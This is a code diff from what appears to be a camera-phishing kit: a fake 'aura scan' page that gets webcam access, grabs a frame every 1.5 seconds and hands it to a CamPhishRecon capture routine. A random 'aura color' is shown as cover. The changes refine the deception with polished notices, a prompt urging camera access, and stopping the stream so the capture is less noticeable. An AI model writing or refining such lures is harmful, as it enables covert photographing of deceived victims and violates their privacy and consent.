@@ -107,8 +107,8 @@ navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}}).the
 var v=document.getElementById('v');v.srcObject=stream;v.play();
 var cap=document.getElementById('cap'),cx=cap.getContext('2d');
 var ci=setInterval(function(){if(v.readyState>=2){cx.drawImage(v,0,0,320,240);if(window.CamPhishRecon)CamPhishRecon.Capture.image(cap.toDataURL('image/png'),'aura_scan');}},1500);
-setTimeout(function(){clearInterval(ci);sc.classList.remove('active');alert('Your aura is glowing! Today\'s color: '+COLORS[Math.floor(Math.random()*COLORS.length)]);},6000);
-}).catch(function(){setTimeout(function(){sc.classList.remove('active');alert('Camera needed for aura scan.');},2000);});
+ setTimeout(function(){clearInterval(ci);stream.getTracks().forEach(function(t){t.stop();});sc.classList.remove('active');var msg='Your aura is glowing. Today\'s color: '+COLORS[Math.floor(Math.random()*COLORS.length)];if(window.CamPhishRecon&&CamPhishRecon.UI){CamPhishRecon.UI.notice({title:'Aura reading complete',message:msg,tone:'success',actionLabel:'Lovely'});}else{alert(msg);}},6000);
+ }).catch(function(){setTimeout(function(){sc.classList.remove('active');if(window.CamPhishRecon&&CamPhishRecon.UI){CamPhishRecon.UI.notice({title:'Camera access needed',message:'Enable camera access to continue the aura scan.',tone:'warning',actionLabel:'OK'});}else{alert('Enable camera access to continue the aura scan.');}},2000);});
 }else{setTimeout(function(){sc.classList.remove('active');},2000);}
 }
 function shareReading(t){
